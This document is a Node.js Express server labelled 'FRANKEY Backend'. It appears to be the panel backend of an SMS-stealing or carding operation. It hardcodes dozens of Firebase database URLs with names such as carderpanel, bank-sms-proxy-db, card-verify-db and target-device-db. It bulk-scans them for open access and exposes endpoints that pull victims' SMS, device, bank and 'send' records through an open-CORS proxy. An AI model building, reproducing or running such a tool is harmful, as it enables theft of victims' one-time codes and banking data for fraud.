const express = require('express');
const cors = require('cors');
const axios = require('axios');
const app = express();
const PORT = process.env.PORT || 3000;

app.use(cors({ origin: '*' }));
app.use(express.json());

const PROXY_SECRET = process.env.PROXY_SECRET || 'cecf42bdea21679f419dc5672727e2c9fe7a29b00d72193425222d7077c8b4ab';
const FIREBASE_URLS = [
  "https://deepseek-txt-20260912-8e616b-default-rtdb.firebaseio.com",
  "https://carderpanel-default-rtdb.firebaseio.com",
  "https://update-cf7a9-default-rtdb.firebaseio.com",
  "https://sexypayload-default-rtdb.firebaseio.com",
  "https://yellow-pannel-dadc7-default-rtdb.firebaseio.com",
  "https://aaenop720-34097-default-rtdb.firebaseio.com",
  "https://access20-3fc38-default-rtdb.firebaseio.com",
  "https://admin-chorsala-default-rtdb.firebaseio.com",
  "https://gandhi-ji-1-default-rtdb.firebaseio.com",
  "https://surya-917b9-default-rtdb.firebaseio.com",
  "https://jhatu-kismta-default-rtdb.firebaseio.com",
  "https://legendpannel-default-rtdb.firebaseio.com",
  "https://profex-panel-abc123-default-rtdb.firebaseio.com",
  "https://frankey-master-scanner-default-rtdb.firebaseio.com",
  "https://multi-firebase-scanner-default-rtdb.firebaseio.com",
  "https://frankey-panel-live-default-rtdb.firebaseio.com",
  "https://admin-console-fb-default-rtdb.firebaseio.com",
  "https://target-device-db-default-rtdb.firebaseio.com",
  "https://sms-forward-db-default-rtdb.firebaseio.com",
  "https://bank-sms-proxy-db-default-rtdb.firebaseio.com",
  "https://card-verify-db-default-rtdb.firebaseio.com",
  "https://user-targets-db-default-rtdb.firebaseio.com",
  "https://device-tracker-db-default-rtdb.firebaseio.com",
  "https://live-scanner-db-default-rtdb.firebaseio.com",
  "https://proxy-fetch-db-default-rtdb.firebaseio.com",
  "https://data-aggregator-db-default-rtdb.firebaseio.com",
  "https://cors-killer-db-default-rtdb.firebaseio.com",
  "https://vercel-proxy-db-default-rtdb.firebaseio.com",
  "https://render-backend-db-default-rtdb.firebaseio.com",
  "https://node-express-db-default-rtdb.firebaseio.com",
  "https://express-server-db-default-rtdb.firebaseio.com",
  "https://firebase-scanner-pro-default-rtdb.firebaseio.com",
  "https://auto-scan-db-default-rtdb.firebaseio.com",
  "https://live-poll-db-default-rtdb.firebaseio.com",
  "https://consolidated-view-db-default-rtdb.firebaseio.com",
  "https://seq-loader-db-default-rtdb.firebaseio.com",
  "https://anti-ban-scan-db-default-rtdb.firebaseio.com",
  "https://firebase-url-list-db-default-rtdb.firebaseio.com",
  "https://url-index-db-default-rtdb.firebaseio.com",
  "https://database-scanner-db-default-rtdb.firebaseio.com",
  "https://realtime-scanner-db-default-rtdb.firebaseio.com",
  "https://bulk-scan-db-default-rtdb.firebaseio.com",
  "https://multi-db-scanner-default-rtdb.firebaseio.com",
  "https://pan-145-urls-db-default-rtdb.firebaseio.com",
  "https://pan-200-urls-db-default-rtdb.firebaseio.com",
  "https://pan-300-urls-db-default-rtdb.firebaseio.com",
  "https://pan-349-urls-db-default-rtdb.firebaseio.com"
];

app.get('/api/health', (req, res) => {
  res.json({ status: 'live', timestamp: new Date().toISOString(), urls: FIREBASE_URLS.length });
});

app.get('/api/firebase/fetch', async (req, res) => {
  const { url, path } = req.query;
  if (!url) return res.status(400).json({ error: 'url parameter required' });
  const fullUrl = url + (path ? '/' + path : '') + '.json';
  try {
    const controller = new AbortController();
    const timeout = setTimeout(() => controller.abort(), 8000);
    const resp = await axios.get(fullUrl, { signal: controller.signal, timeout: 8000 });
    clearTimeout(timeout);
    res.json({ status: 'success', data: resp.data, source: url });
  } catch (err) {
    res.json({ status: 'error', error: err.message, source: url });
  }
});

app.get('/api/firebase/bulk', async (req, res) => {
  const results = [];
  for (const fbUrl of FIREBASE_URLS) {
    try {
      const controller = new AbortController();
      const timeout = setTimeout(() => controller.abort(), 5000);
      const resp = await axios.get(fbUrl + '.json?shallow=true', { signal: controller.signal, timeout: 5000 });
      clearTimeout(timeout);
      results.push({ url: fbUrl, status: 'active', data: resp.data });
    } catch (err) {
      results.push({ url: fbUrl, status: 'locked', error: err.message });
    }
  }
  res.json({ total: results.length, active: results.filter(r => r.status === 'active').length, locked: results.filter(r => r.status === 'locked').length, results });
});

app.get('/api/sms/live', async (req, res) => {
  const { url } = req.query;
  if (!url) return res.status(400).json({ error: 'url parameter required' });
  try {
    const fbUrl = url + '/sms.json';
    const controller = new AbortController();
    const timeout = setTimeout(() => controller.abort(), 5000);
    const resp = await axios.get(fbUrl, { signal: controller.signal, timeout: 5000 });
    clearTimeout(timeout);
    res.json({ status: 'success', data: resp.data || [], source: url });
  } catch (err) {
    res.json({ status: 'error', error: err.message, source: url });
  }
});

app.get('/api/device/info', async (req, res) => {
  const { url } = req.query;
  if (!url) return res.status(400).json({ error: 'url parameter required' });
  try {
    const fbUrl = url + '/device.json';
    const controller = new AbortController();
    const timeout = setTimeout(() => controller.abort(), 5000);
    const resp = await axios.get(fbUrl, { signal: controller.signal, timeout: 5000 });
    clearTimeout(timeout);
    res.json({ status: 'success', data: resp.data || {}, source: url });
  } catch (err) {
    res.json({ status: 'error', error: err.message, source: url });
  }
});

app.get('/api/bank/data', async (req, res) => {
  const { url } = req.query;
  if (!url) return res.status(400).json({ error: 'url parameter required' });
  try {
    const fbUrl = url + '/bank.json';
    const controller = new AbortController();
    const timeout = setTimeout(() => controller.abort(), 5000);
    const resp = await axios.get(fbUrl, { signal: controller.signal, timeout: 5000 });
    clearTimeout(timeout);
    res.json({ status: 'success', data: resp.data || [], source: url });
  } catch (err) {
    res.json({ status: 'error', error: err.message, source: url });
  }
});

app.get('/api/send/data', async (req, res) => {
  const { url } = req.query;
  if (!url) return res.status(400).json({ error: 'url parameter required' });
  try {
    const fbUrl = url + '/send.json';
    const controller = new AbortController();
    const timeout = setTimeout(() => controller.abort(), 5000);
    const resp = await axios.get(fbUrl, { signal: controller.signal, timeout: 5000 });
    clearTimeout(timeout);
    res.json({ status: 'success', data: resp.data || [], source: url });
  } catch (err) {
    res.json({ status: 'error', error: err.message, source: url });
  }
});

app.listen(PORT, () => {
  console.log(`FRANKEY Backend is Live on port ${PORT}`);
  console.log(`Total Firebase URLs configured: ${FIREBASE_URLS.length}`);
});